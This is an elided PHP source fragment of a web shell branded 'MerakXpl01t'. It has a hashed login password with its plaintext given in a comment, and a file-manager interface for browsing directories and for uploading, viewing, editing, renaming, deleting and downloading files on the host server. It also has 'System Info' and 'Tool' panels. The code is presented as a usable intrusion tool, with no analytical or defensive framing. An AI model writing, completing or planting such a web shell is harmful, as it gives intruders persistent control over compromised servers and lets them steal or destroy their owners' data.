...
$password = "329eadfcb8f4deee2155009da4545105"; # md5: merakxpl01t
...
<meta name='author' content='MerakXpl01t'>
<meta charset="UTF-8">
<style type='text/css'>
...
?>
   <label for="<?= $label ?>" class="font-weight-bold">
      ...
      [ <a class="text-success" href="?act=view&dir=<?= "$dir&file=" . $file ?>">view</a> ]
      ...
      [ <a class="text-danger" href="?act=delete&dir=<?= "$dir&file=" . $file ?>">delete</a> ]
   </label>
<?php
}
...
?>
   ...
   <body style="background-color:#000">
      <nav style="background-color:#000" class="navbar navbar-expand-md navbar-dark">
         <a class="nav-link font-weight-bold text-success" href="<?= $_SERVER['PHP_SELF'] ?>">
            MerakXpl01t
         </a>
            ...
            <ul class="navbar-nav">
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link font-weight-bold text-success" href="<?= "?dir=$dir&opt=upload" ?>">Upload File</a>
                  </button>
               </li>
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link font-weight-bold text-success" data-toggle="collapse" href="#info" role="button" data-target="#info" aria-expanded="false" aria-controls="info">System Info</a>
                  </button>
               </li>
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link font-weight-bold text-success" data-toggle="collapse" href="#tool" role="button" data-target="#tool" aria-expanded="false" aria-controls="tool">Tool</a>
                  </button>
               </li>
            </ul>
         </div>
               ...
               <div class="table-responsive">
                  <table class="table table-bordered table-striped table-hover">
                     <thead class="thead-dark text-center">
                        <tr>
                           <th class="font-weight-bold text-success">Name</th>
                           <th class="font-weight-bold text-success">Filetype</th>
                           <th class="font-weight-bold text-success">Perm</th>
                           <th class="font-weight-bold text-success">Option</th>
                        </tr>
                     </thead>
                     <tbody class="font-weight-bold text-success border-dark">
                        <?php
                        foreach ($scandir as $direc) {
                           $dtype = filetype("$dir/$direc");
                           if ($direc === '..') {
                              $href = "<a class='text-danger' href='?dir=" . dirname($dir) . "'>$direc</a>";
                           } elseif ($direc === '.') {
                              $href = "<a class='text-danger' href='?dir=$dir'>$direc</a>";
                           } else {
                              $href = "<a class='text-danger' href='?dir=$dir/$direc'>$direc</a>";
                           }
                           if ($direc === '.' || $direc === '..') {
                              $act_dir = "<a class='text-decoration-none text-success' href='?act=newfile&dir=$dir'>newfile</a> | <a class='text-decoration-none text-success' href='?act=newfolder&dir=$dir'>newfolder</a>";
                           } else {
                              $act_dir = "<a class='text-decoration-none text-success' href='?act=rename_dir&dir=$dir/$direc'>rename</a> | <a class='text-decoration-none text-danger' href='?act=delete_dir&dir=$dir/$direc'>delete</a>";
                           }
                  ...
                  foreach ($scandir as $file) {
                     ...
                     <tr>
                        <td class="border-dark">
                           <?= $i ?>
                           <a class="text-success" href="?act=view&dir=<?= "$dir&file=$dir/$file" ?>"><?= $file ?></a>
                        </td>
                        ...
                        <td class="text-danger border-dark">
                           <a class="text-decoration-none text-success" href="?act=edit&dir=<?= "$dir&file=$dir/$file" ?>">edit</a> |
                           <a class="text-decoration-none text-success" href="?act=rename&dir=<?= "$dir&file=$dir/$file" ?>">rename</a> |
                           <a class="text-decoration-none text-danger" href="?act=delete&dir=<?= "$dir&file=$dir/$file" ?>">delete</a> |
                           <a class="text-decoration-none text-success" href="?act=download&dir=<?= "$dir&file=$dir/$file" ?>">download</a>
                        </td>
                     </tr>
                  <?php
                  }
